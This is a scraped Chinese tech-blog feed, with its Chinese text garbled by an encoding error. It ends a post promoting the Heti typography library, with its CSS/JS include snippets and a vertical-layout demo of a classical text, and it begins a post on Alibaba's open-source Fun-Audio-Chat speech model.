<li><strong>ä¸­è¥¿æ–‡æ··æ’ç¾åŒ–</strong>ï¼šè‡ªåŠ¨åœ¨ä¸­è‹±æ–‡ä¹‹é—´æ·»åŠ é€‚å½“é—´è·ï¼Œå†ä¹Ÿä¸ç”¨æ‰‹åŠ¨æ•²ç©ºæ ¼</li>
<li><strong>å…¨è§’æ ‡ç‚¹æŒ¤å‹</strong>ï¼šæ™ºèƒ½è°ƒæ•´æ ‡ç‚¹ç¬¦å·çš„é—´è·ï¼Œé¿å…å‡ºç°éš¾çœ‹çš„ç©ºç™½</li>
</ul>
<h3 data-id="heading-7">ğŸ¨ å­—ä½“ä¼˜åŒ–</h3>
<p>æä¾›å¤šç§é¢„è®¾çš„ä¸­æ–‡å­—ä½“æ—é€‰æ‹©ï¼ˆæ¡Œé¢ç«¯ï¼‰ï¼Œå¯æ ¹æ®ä¸åŒå†…å®¹é£æ ¼æ­é…æœ€åˆé€‚çš„å­—ä½“ç»„åˆã€‚</p>
<h2 data-id="heading-8">æç®€çš„å®‰è£…ä¸ä½¿ç”¨</h2>
<p>èµ«è¹çš„è®¾è®¡å“²å­¦æ˜¯â€œæœ€å°åŒ–ä¾µå…¥â€ï¼Œä½¿ç”¨èµ·æ¥å¼‚å¸¸ç®€å•ï¼š</p>
<h3 data-id="heading-9">åŸºç¡€ä½¿ç”¨ï¼ˆä»…CSSï¼‰</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 1. å¼•å…¥æ ·å¼ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"//unpkg.com/heti/umd/heti.min.css"</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 2. æ·»åŠ ç±»å --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">article</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"heti"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>æ–‡ç« æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è¿™é‡Œæ˜¯ä½ æ‰€æœ‰çš„ä¸­æ–‡å†…å®¹...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span>
</code></pre>
<p>åªéœ€è¿™ä¸¤æ­¥ï¼Œä½ çš„å†…å®¹å°±ä¼šç«‹åˆ»è·å¾—ä¸“ä¸šçº§çš„ä¸­æ–‡æ’ç‰ˆæ•ˆæœã€‚</p>
<h3 data-id="heading-10">å¢å¼ºåŠŸèƒ½ï¼ˆæ·»åŠ JavaScriptï¼‰</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"//unpkg.com/heti/umd/heti-addon.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> heti = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Heti</span>(<span class="hljs-string">'.heti'</span>);
  heti.<span class="hljs-title function_">autoSpacing</span>(); <span class="hljs-comment">// å¯ç”¨æ™ºèƒ½ä¸­è¥¿æ–‡æ··æ’å’Œæ ‡ç‚¹æŒ¤å‹</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-11">å®é™…æ•ˆæœå±•ç¤º</h2>
<p>æˆ‘æ¯”è¾ƒå–œæ¬¢çš„æ˜¯<code>ç«–æ’</code>æ’ç‰ˆçš„æ ·å¼,æˆ‘ä»¬åœ¨markdownä¸­ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå¦‚ä¸‹ä½¿ç”¨</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"//unpkg.com/heti/umd/heti.min.css"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card__vertical-container"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"heti--vertical heti--ancient"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å‡ºå¸«è¡¨<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"heti-small"</span>&gt;</span>ä½œè€…ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">abbr</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"å­—å­”æ˜"</span>&gt;</span>è«¸è‘›äº®<span class="hljs-tag">&lt;/<span class="hljs-name">abbr</span>&gt;</span>ï¼ˆ181å¹´ï¼234å¹´10æœˆ8æ—¥ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å…ˆå¸å‰µæ¥­æœªåŠï¼Œè€Œä¸­é“å´©æ®‚ï¼›ä»Šå¤©ä¸‹ä¸‰åˆ†ï¼Œç›Šå·ç–²å¼Šï¼Œæ­¤èª å±æ€¥å­˜äº¡ä¹‹ç§‹ä¹Ÿï¹—ç„¶ä¾è¡ä¹‹è‡£ï¼Œä¸æ‡ˆæ–¼å…§ï¼›å¿ å¿—ä¹‹å£«ï¼Œå¿˜èº«æ–¼å¤–è€…ï¼Œè“‹è¿½å…ˆå¸ä¹‹æ®Šé‡ï¼Œæ¬²å ±ä¹‹æ–¼é™›ä¸‹ä¹Ÿã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>èª å®œé–‹å¼µè–è½ï¼Œä»¥å…‰å…ˆå¸éºå¾·ï¼Œæ¢å¼˜å¿—å£«ä¹‹æ°£ï¹”ä¸å®œå¦„è‡ªè²è–„ï¼Œå¼•å–»å¤±ç¾©ï¼Œä»¥å¡å¿ è««ä¹‹è·¯ä¹Ÿã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å®®ä¸­ã€åºœä¸­ï¼Œä¿±ç‚ºä¸€é«”ï¼›é™Ÿç½°è‡§å¦ï¼Œä¸å®œç•°åŒã€‚è‹¥æœ‰ä½œå§¦ã€çŠ¯ç§‘ï¼ŒåŠç‚ºå¿ å–„è€…ï¼Œå®œä»˜æœ‰å¸ï¼Œè«–å…¶åˆ‘è³ï¼Œä»¥æ˜­é™›ä¸‹å¹³æ˜ä¹‹æ²»ï¼›ä¸å®œåç§ï¼Œä½¿å…§å¤–ç•°æ³•ä¹Ÿã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ä¾ä¸­ã€ä¾éƒéƒ­æ”¸ä¹‹ã€è²»ç¦•ã€è‘£å…ç­‰ï¼Œæ­¤çš†è‰¯å¯¦ï¼Œå¿—æ…®å¿ ç´”ï¼Œæ˜¯ä»¥å…ˆå¸ç°¡æ‹”ä»¥éºé™›ä¸‹ã€‚æ„šä»¥ç‚ºå®®ä¸­ä¹‹äº‹ï¼Œäº‹ç„¡å¤§å°ï¼Œæ‚‰ä»¥å’¨ä¹‹ï¼Œç„¶å¾Œæ–½è¡Œï¼Œå¿…èƒ½è£¨è£œé—•æ¼ï¼Œæœ‰æ‰€å»£ç›Šã€‚å°‡è»å‘å¯µï¼Œæ€§è¡Œæ·‘å‡ï¼Œæ›‰æš¢è»äº‹ï¼Œè©¦ç”¨æ–¼æ˜”æ—¥ï¼Œå…ˆå¸ç¨±ä¹‹æ›°ã€Œèƒ½ã€ï¼Œæ˜¯ä»¥çœ¾è­°èˆ‰å¯µç‚ºç£ã€‚æ„šä»¥ç‚ºç‡Ÿä¸­ä¹‹äº‹ï¼Œæ‚‰ä»¥å’¨ä¹‹ï¼Œå¿…èƒ½ä½¿è¡Œé™£å’Œç¦ï¼Œå„ªåŠ£å¾—æ‰€ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è¦ªè³¢è‡£ï¼Œé å°äººï¼Œæ­¤å…ˆæ¼¢æ‰€ä»¥èˆˆéš†ä¹Ÿï¹”è¦ªå°äººï¼Œé è³¢è‡£ï¼Œæ­¤å¾Œæ¼¢æ‰€ä»¥å‚¾é ¹ä¹Ÿã€‚å…ˆå¸åœ¨æ™‚ï¼Œæ¯èˆ‡è‡£è«–æ­¤äº‹ï¼Œæœªå˜—ä¸æ­æ¯ç—›æ¨æ–¼æ¡“ã€éˆä¹Ÿï¼ä¾ä¸­ã€å°šæ›¸ã€é•·å²ã€åƒè»ï¼Œæ­¤æ‚‰è²è‰¯æ­»ç¯€ä¹‹è‡£ï¼Œé¡˜é™›ä¸‹è¦ªä¹‹ã€ä¿¡ä¹‹ï¼Œå‰‡æ¼¢å®¤ä¹‹éš†ï¼Œå¯è¨ˆæ—¥è€Œå¾…ä¹Ÿã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è‡£æœ¬å¸ƒè¡£ï¼Œèº¬è€•æ–¼å—é™½ï¼Œè‹Ÿå…¨æ€§å‘½æ–¼äº‚ä¸–ï¼Œä¸æ±‚èé”æ–¼è«¸ä¾¯ã€‚å…ˆå¸ä¸ä»¥è‡£å‘é„™ï¼ŒçŒ¥è‡ªæ‰å±ˆï¼Œä¸‰é¡§è‡£æ–¼è‰å»¬ä¹‹ä¸­ï¼Œè«®è‡£ä»¥ç•¶ä¸–ä¹‹äº‹ï¼›ç”±æ˜¯æ„Ÿæ¿€ï¼Œé‚è¨±å…ˆå¸ä»¥é©…é¦³ã€‚å¾Œå€¼å‚¾è¦†ï¼Œå—ä»»æ–¼æ•—è»ä¹‹éš›ï¼Œå¥‰å‘½æ–¼å±é›£ä¹‹é–“ï¼Œçˆ¾ä¾†äºŒåæœ‰ä¸€å¹´çŸ£ã€‚å…ˆå¸çŸ¥è‡£è¬¹æ…ï¼Œæ•…è‡¨å´©å¯„è‡£ä»¥å¤§äº‹ä¹Ÿã€‚å—å‘½ä»¥ä¾†ï¼Œå¤™å¤œæ†‚æ­ï¼Œæè¨—ä»˜ä¸æ•ˆï¼Œä»¥å‚·å…ˆå¸ä¹‹æ˜ã€‚æ•…äº”æœˆæ¸¡ç€˜ï¼Œæ·±å…¥ä¸æ¯›ã€‚ä»Šå—æ–¹å·²å®šï¼Œå…µç”²å·²è¶³ï¼Œç•¶çç‡ä¸‰è»ï¼ŒåŒ—å®šä¸­åŸï¼Œåº¶ç«­é§‘éˆï¼Œæ”˜é™¤å§¦å‡¶ï¼Œèˆˆå¾©æ¼¢å®¤ï¼Œé‚„æ–¼èˆŠéƒ½ã€‚æ­¤è‡£æ‰€ä»¥å ±å…ˆå¸è€Œå¿ é™›ä¸‹ä¹‹è·åˆ†ä¹Ÿã€‚è‡³æ–¼æ–Ÿé…Œæç›Šï¼Œé€²ç›¡å¿ è¨€ï¼Œå‰‡æ”¸ä¹‹ã€ç¦•ã€å…ä¹‹ä»»ä¹Ÿã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>é¡˜é™›ä¸‹è¨—è‡£ä»¥è¨è³Šèˆˆå¾©ä¹‹æ•ˆï¼›ä¸æ•ˆï¼Œå‰‡æ²»è‡£ä¹‹ç½ªï¼Œä»¥å‘Šå…ˆå¸ä¹‹éˆã€‚è‹¥ç„¡èˆˆå¾·ä¹‹è¨€ï¼Œå‰‡è²¬æ”¸ä¹‹ã€ç¦•ã€å…ç­‰ä¹‹æ…¢ï¼Œä»¥å½°å…¶å’ã€‚é™›ä¸‹äº¦å®œè‡ªè¬€ï¼Œä»¥è«®è«å–„é“ï¼Œå¯Ÿç´é›…è¨€ï¼Œæ·±è¿½å…ˆå¸éºè©”ã€‚è‡£ä¸å‹å—æ©æ„Ÿæ¿€ã€‚ä»Šç•¶é é›¢ï¼Œè‡¨è¡¨æ¶•é›¶ï¼Œä¸çŸ¥æ‰€è¨€ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66cd0cea86df43b4b42d33db05df510e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767973359&amp;x-signature=fnlY5JZqQyF9f1LnM5jYA6VkdRw%3D" alt="_20260102_224539.png" loading="lazy"/></p>
<p>_20260102_224539.png</p>
<p>æˆ‘ä½¿ç”¨ai åŸºäºèµ«è¹ï¼ˆhÃ¨tÃ­ï¼‰åšäº†ä¸€ä¸ªç«–ç‰ˆæ’ç‰ˆçš„ç½‘ç«™ï¼Œæ„Ÿå…´è¶£çš„å®¶äººä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹</p>
<p>åšä¸»ç«–ç‰ˆæ’ç‰ˆç½‘å€ï¼š <a href="https://link.juejin.cn?target=http%3A%2F%2Fh5.xiuji.mynatapp.cc%2Fheti%2F" target="_blank" title="http://h5.xiuji.mynatapp.cc/heti/" ref="nofollow noopener noreferrer">h5.xiuji.mynatapp.cc/heti/</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/306711b4cbac4f0c980f268a244573e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767973359&amp;x-signature=6mAEs7SPQyp%2FZOhpGGTM4QRMQsY%3D" alt="_20260102_232901.png" loading="lazy"/></p>
<p>_20260102_232901.png</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1f0192156d445ceaa4a8f701c5b2a4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767973359&amp;x-signature=4WnpAxJXKTshftIuEHu2rRk9zaY%3D" alt="_.png" loading="lazy"/></p>
<p>_.png</p>
<h2 data-id="heading-12">ç»“è¯­ï¼šè®©å†…å®¹å›å½’æœ¬è´¨</h2>
<p>åœ¨è¿½æ±‚ç‚«é…·äº¤äº’å’Œå¤æ‚åŠ¨ç”»çš„ä»Šå¤©ï¼Œèµ«è¹æé†’æˆ‘ä»¬ä¸€ä¸ªåŸºæœ¬äº‹å®ï¼šå¯¹äºå†…å®¹å‹ç½‘ç«™ï¼Œ<strong>ä¼˜ç§€çš„å¯è¯»æ€§æ‰æ˜¯æœ€é‡è¦çš„ç”¨æˆ·ä½“éªŒ</strong>ã€‚è¿™ä¸ªé¡¹ç›®ä»¥æä½çš„æˆæœ¬ï¼Œä¸ºä¸­æ–‡ç½‘é¡µå¸¦æ¥äº†æ˜¾è‘—çš„å“è´¨æå‡ã€‚</p>
<p>å¦‚æœä½ æ­£åœ¨ç»è¥ä¸€ä¸ªä»¥ä¸­æ–‡å†…å®¹ä¸ºä¸»çš„ç½‘ç«™ï¼Œæˆ–è€…åªæ˜¯æƒ³åœ¨ä¸ªäººåšå®¢ä¸Šè·å¾—æ›´å¥½çš„æ’ç‰ˆæ•ˆæœï¼Œä¸å¦¨å°è¯•ä¸€ä¸‹èµ«è¹ã€‚æ­£å¦‚é¡¹ç›®READMEä¸­æ‰€è¯´çš„ï¼šâ€œæ€»ä¹‹ï¼Œç”¨ä¸Šå°±ä¼šå˜å¥½çœ‹ã€‚â€</p>
<p>èµ«è¹ä¸ä»…æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œæ›´æ˜¯å¯¹ä¸­æ–‡æ•°å­—é˜…è¯»ä½“éªŒçš„ä¸€æ¬¡ä¼˜é›…è‡´æ•¬ã€‚åœ¨è¿™ä¸ªæ³¨æ„åŠ›ç¨€ç¼ºçš„æ—¶ä»£ï¼Œä¸ºè¯»è€…æä¾›ä¸€ä¸ªèˆ’é€‚çš„é˜…è¯»ç¯å¢ƒï¼Œæˆ–è®¸å°±æ˜¯æœ€å¥½çš„å†…å®¹ç­–ç•¥ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ«å»¶è¿Ÿï¼é€šä¹‰å¼€æºFun-Audio-Chatï¼Œè¿™æ‰æ˜¯æˆ‘ä»¬è¦çš„è¯­éŸ³AI]]></title>    <link>https://juejin.cn/post/7589940210832228395</link>    <guid>https://juejin.cn/post/7589940210832228395</guid>    <pubDate>2026-01-02T14:07:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940210832228395" data-draft-id="7590020026395279414" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ«å»¶è¿Ÿï¼é€šä¹‰å¼€æºFun-Audio-Chatï¼Œè¿™æ‰æ˜¯æˆ‘ä»¬è¦çš„è¯­éŸ³AI"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-02T14:07:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¢¨é£å¦‚é›ª"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ«å»¶è¿Ÿï¼é€šä¹‰å¼€æºFun-Audio-Chatï¼Œè¿™æ‰æ˜¯æˆ‘ä»¬è¦çš„è¯­éŸ³AI
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¢¨é£å¦‚é›ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T14:07:20.000Z" title="Fri Jan 02 2026 14:07:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¯´å®è¯ï¼Œç©äº†è¿™ä¹ˆä¹…çš„è¯­éŸ³åŠ©æ‰‹ï¼Œæœ€è®©æˆ‘éš¾å—çš„ä¸æ˜¯å®ƒå¬ä¸æ‡‚ï¼Œè€Œæ˜¯é‚£ç§æ˜æ˜¾çš„â€œå‰²è£‚æ„Ÿâ€ã€‚</p>
<p>ä½ è¯´å®Œä¸€å¥è¯ï¼Œç³»ç»Ÿå¼€å§‹è½¬åœˆï¼ŒæŠŠå£°éŸ³è½¬æˆå­—ï¼Œä¸¢ç»™å¤§æ¨¡å‹æ€è€ƒï¼Œç”Ÿæˆæ–‡å­—ï¼Œå†æ‰¾ä¸ªTTSå¿µå‡ºæ¥ã€‚è¿™ä¸€å¥—æµç¨‹ä¸‹æ¥ï¼Œå“ªæ€•å»¶è¿Ÿåªæœ‰ä¸€ä¸¤ç§’ï¼Œé‚£ç§â€œæˆ‘åœ¨è·Ÿæœºå™¨è¯´è¯â€çš„æ„Ÿè§‰ä¹ŸæŒ¥ä¹‹ä¸å»ã€‚</p>
<p>ä½†åœ¨2025å¹´å¹´åº•ï¼Œè¿™ä¸ªå±€é¢å¯èƒ½çœŸçš„è¦å˜äº†ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-02_21.58.28-1024x384.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-02_21.58.28-1024x384.png" ref="nofollow noopener noreferrer"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df3c2e24c2a14683bef6a97cce0d1b37~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767967639&amp;x-signature=O2MjY%2BvCRcsmcz9AkPY4915XT00%3D" alt="iShot_2026-01-02_21.58.28" loading="lazy"/></a></p>
<p>å°±åœ¨12æœˆ23æ—¥ï¼Œé˜¿é‡Œé€šä¹‰å¤§æ¨¡å‹å›¢é˜Ÿæ‚„æ‚„æ‰”å‡ºäº†ä¸€ä¸ªé‡ç£…ç‚¸å¼¹ï¼š<strong>Fun-Audio-Chat-8B</strong>ã€‚è¿™ä¸æ˜¯åˆä¸€ä¸ªæ™®é€šçš„è¯­éŸ³åŠ©æ‰‹ï¼Œè€Œæ˜¯é€šä¹‰ç™¾è†å®¶æ—é‡Œé¦–ä¸ªä¸»æ‰“**ç«¯åˆ°ç«¯â€œè¯­éŸ³å¯¹è¯­éŸ³â€**äº¤äº’çš„æ¨¡å‹ã€‚</p>
<p>æœ€å…³é”®çš„æ˜¯ï¼Œå®ƒç›´æ¥å¼€æºäº†ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ¬¡ä¸ä¸€æ ·ï¼Ÿ</strong></p>
<p>ä»¥å‰æˆ‘ä»¬åšè¯­éŸ³äº¤äº’ï¼Œåƒæ˜¯ææ¥åŠ›èµ›ï¼Œè€³æœµï¼ˆASRï¼‰ã€å¤§è„‘ï¼ˆLLMï¼‰å’Œå˜´å·´ï¼ˆTTSï¼‰å„è·‘å„çš„ã€‚Fun-Audio-Chatç›´æ¥æŠŠè¿™ä¸ªæµç¨‹æ‰“é€šäº†ï¼Œå®ƒé‡‡ç”¨äº†ä¸€ç§å«**ç«¯åˆ°ç«¯S2Sï¼ˆSequence-to-Sequenceï¼‰**çš„æ¶æ„ã€‚ç®€å•æ¥è¯´ï¼Œæ¨¡å‹ç›´æ¥å¬å£°éŸ³ï¼Œç„¶åç›´æ¥åå£°éŸ³ã€‚</p>
